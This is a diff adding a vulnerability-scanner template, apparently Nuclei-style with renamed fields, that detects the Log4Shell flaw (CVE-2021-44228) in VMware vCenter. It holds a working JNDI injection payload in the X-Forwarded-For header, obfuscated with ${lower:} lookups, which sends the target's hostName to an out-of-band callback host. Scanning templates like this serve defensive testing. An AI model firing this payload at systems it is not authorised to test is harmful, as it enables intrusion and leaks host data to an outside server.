@@ -1,0 +1,30 @@
+id: vmware-vcenter-log4j-rce
+brief:
+    title: VMware VCenter - Remote Code Execution (Apache Log4j)
+    by: _0xf4n9x_
+    level: critical
+    about: VMware VCenter is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a co...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - vcenter
+        - vmware
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/websso/SAML2/SSO/vsphere.local?SAMLRequest='
+      head:
+        X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
